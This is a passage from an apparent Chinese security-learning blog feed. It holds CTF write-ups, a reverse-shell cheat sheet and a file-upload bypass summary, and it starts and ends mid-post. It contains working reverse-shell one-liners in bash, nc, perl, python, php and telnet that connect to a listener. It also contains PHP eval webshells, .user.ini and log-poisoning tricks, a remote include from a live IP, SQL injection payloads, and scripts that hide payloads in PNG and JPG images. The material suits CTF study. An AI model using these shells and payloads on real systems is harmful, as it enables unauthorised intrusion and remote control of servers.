<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
<p>config如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
<p>可以看到成功获得了cookie</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
<p>ocr识别的话，如下</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
<p>一些设置如下，需要保存在config.yml中</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python实践</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>初夏赛复盘</title>
    <url>/posts/63fc7f18/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
<p>过滤绕过</p>
</blockquote>
<p>|| 代替 or</p>
<p>!(a&lt;&gt;a) 代替 =</p>
<p>/**/ 代替 空格</p>
<p>mid 代替 left right substr</p>
<p>3’/<strong>/||/</strong>/!(1&lt;&gt;1)#</p>
<p>3’/<strong>/||/</strong>/!(database()&lt;&gt;’cumtctf’)#</p>
<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,1)&lt;&gt;’f’)#;</p>
<p>1’/<strong>/||/</strong>/!(mid((select/<strong>/group_concat(table_name)/</strong>/from/<strong>/mysql.innodb_table_stats/</strong>/where/**/!(database_name&lt;&gt;’cumtctf’)),1,34)&lt;&gt;’flag_table,no_use_table,test,users’)#;</p>
<p>无列名注入这个有点离谱<br>直接把flag给试出来了？？？</p>
<p>1’/<strong>/||/</strong>/(select/<strong>/(‘flag{cumtctf_sql_is_s0_e@sy}’,0)&gt;(select/</strong>/*/<strong>/from/</strong>/flag_table/<strong>/limit/</strong>/1,1));#</p>
<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>php在64位系统中，当索引大小为9223372036854775808会溢出</p>
<pre><code>payload:web=flag&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806
</code></pre>
<p>jphide:</p>
<p>这个有GUI界面不用命令输入密码就行。</p>
<h2 id="RCE-Me"><a href="#RCE-Me" class="headerlink" title="RCE_Me"></a>RCE_Me</h2>]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sql注入</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell测试</title>
    <url>/posts/9f6aba72/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机为一台ubuntu，测试机为kali，两者位于同一网段内</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
<ul>
<li>标准输入standard input 0 （默认设备键盘）</li>
<li>标准输出standard output 1（默认设备显示器）</li>
<li>错误输出：error output 2（默认设备显示器）</li>
</ul>
<p>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</p>
<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><ul>
<li>输入重定向 &lt; &lt;&lt;</li>
<li>输出重定向 &gt; &gt;&gt;</li>
</ul>
<ol>
<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令</p>
</li>
<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
</li>
<li><p><strong>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</strong></p>
</li>
<li><p>重定向就是针对文件描述符的操作</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入重定向:</span></span><br><span class="line">[n]&lt; [file] <span class="comment">#n为文件描述符 默认为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出重定向：</span></span><br><span class="line">[n]&gt; [file] <span class="comment">#默认为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#标准输出与标准错误输出重定向：</span></span><br><span class="line">&amp;&gt; [file] &gt;&amp; [file] 等价于 &gt; [file] 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>靶机</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.217.128/7000 0&gt;&amp;1
</code></pre>
<p>-i 打开一个可交互的shell，&gt;&amp; 将混合输出重定向到文件（这里的&amp;是混合输出包括标准和错误的意思），0&gt;&amp;1 将标准输入重定向到文件（与前者不同，这里的 &amp; 是为了区分文件描述符和数字名的文件），其中 /dev/tcp/192.168.217.128/7000 就相当于是一个文件</p>
<p>kali</p>
<pre><code>nc -lvp 7000
</code></pre>
<p>nc监听7000端口</p>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><pre><code>exec 5&lt;&gt;/dev/tcp/192.168.217.128/7000;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done
</code></pre>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre><code>nc -e /bin/sh 192.168.217.128 7000
</code></pre>
<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre><code>perl -e &#39;use Socket;$i=&quot;192.168.217.128&quot;;$p=7000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
</code></pre>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.217.128&quot;,7000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.217.128&quot;,7000);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre>
<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><pre><code>mknod backpipe p &amp;&amp; telnet 192.168.217.128 7000 0&lt;backpipe | /bin/bash 1&gt;backpipe
</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
<p><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html">https://www.cnblogs.com/iouwenbo/p/11277453.html</a></p>
<p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>测试工具</tag>
      </tags>
  </entry>
  <entry>
    <title>博客主站点关闭通知</title>
    <url>/posts/9fc12a02/</url>
    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
<p><strong>哎！马老师，发生什么事了？</strong></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>国庆赛部分赛题复现</title>
    <url>/posts/bfdb9200/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
<p>环境有点问题，复现一半出不来了</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>

<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
<p>先通过任意文件读取漏洞获得密钥和密文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>

<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传总结</title>
    <url>/posts/ea42f6a6/</url>
    <content><![CDATA[<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><ol>
<li>绕过各种前端过滤</li>
<li>上传.user.ini/.htaccess</li>
<li>上传包含一句话文件/日志包含/远程文件包含</li>
<li>绕过关键字过滤</li>
<li>绕过特殊类型如二次渲染/httpd</li>
<li>session竞争</li>
</ol>
<h2 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h2><p>直接改前端代码即可</p>
<h2 id="简单后端过滤"><a href="#简单后端过滤" class="headerlink" title="简单后端过滤"></a>简单后端过滤</h2><p>content-type 改为 image/png(jpg/gif)</p>
<p>filename 改后缀</p>
<p>改文件头为gif头</p>
<pre><code>GIF89a
</code></pre>
<p>改文件头为png头，直接在hex改</p>
<pre><code>89504e470d0a
</code></pre>
<p>00截断</p>
<p>test.php1png</p>
<p>hex中将31改为00</p>
<p>php3 php4测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="user-ini上传"><a href="#user-ini上传" class="headerlink" title=".user.ini上传"></a>.user.ini上传</h2><p>upload/下存在index.php</p>
<p>先上传.user.ini，再上传1.txt或其他支持上传类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;% @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); %&gt;</span><br></pre></td></tr></table></figure>
<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p>[]替换为{}</p>
<p>[] {}全过滤</p>
<pre><code>&lt;?=@eval(array_pop($_POST));?&gt;
</code></pre>
<p>; 可直接去掉;</p>
<p>空格过滤将空格改hex为0d</p>
<p>. 过滤用远程文件包含</p>
<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>过滤()<br>.user.ini 自动包含文件如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 过滤 log 用 . 分开即可</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">若有过滤，可这样写</span><br><span class="line"><span class="meta">&lt;?=</span>include1<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br><span class="line">之后改hex将<span class="number">1</span>改为od</span><br></pre></td></tr></table></figure>

<p>域名下随机写入1.txt，改User-Agent为</p>
<pre><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;
</code></pre>
<p>访问upload/测试</p>
<h2 id="getimagesize绕过"><a href="#getimagesize绕过" class="headerlink" title="getimagesize绕过"></a>getimagesize绕过</h2><p>改头为gif头</p>
<p>GIF89a</p>
<h2 id="include-url-远程文件包含"><a href="#include-url-远程文件包含" class="headerlink" title="include url 远程文件包含"></a>include url 远程文件包含</h2><p>用我自己的url，返回一个一句话木马</p>
<p><a href="http://47.100.75.233/">http://795102185</a></p>
<pre><code>&lt;?=include&#39;http://795102185&#39;&gt;
</code></pre>
<p>基本可以通杀</p>
<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><h3 id="gif格式"><a href="#gif格式" class="headerlink" title="gif格式"></a>gif格式</h3><p>比较简单，直接对比没有改变的地方，在里面直接插入即可</p>
<h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?0=call_user_func post 1=ls</span></span><br><span class="line"><span class="comment"># ?0=system 1=whoami</span></span><br><span class="line"></span><br><span class="line">利用抓包看信息，可能不回显</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="jpg格式"><a href="#jpg格式" class="headerlink" title="jpg格式"></a>jpg格式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1=phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> 